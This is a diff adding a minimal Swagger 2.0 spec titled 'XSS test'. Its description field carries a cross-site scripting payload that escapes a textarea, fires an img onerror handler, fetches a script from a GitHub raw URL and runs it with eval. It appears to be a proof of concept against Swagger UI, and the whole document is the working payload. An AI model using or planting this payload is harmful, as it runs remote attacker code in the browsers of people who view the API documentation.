@@ -1,0 +1,5 @@
+swagger: '2.0'
+info:
+  title: XSS test
+  description: <a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/script.js`).then(function(res){res.text().then(function(data){eval(data)})})>'>">"
+  version: production
